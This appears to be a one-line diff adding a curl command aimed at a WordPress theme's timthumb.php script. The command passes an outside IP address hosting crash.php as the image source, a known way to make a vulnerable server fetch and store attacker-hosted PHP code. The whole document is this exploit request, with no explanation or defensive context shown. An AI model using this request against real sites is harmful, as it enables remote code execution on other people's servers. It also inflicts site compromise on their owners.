@@ -1,0 +1,1 @@
+curl -X GET http://hello.app:4080/wp-content/themes/thedawn/lib/scripts/timthumb.php?src=http://66.240.183.75/crash.php
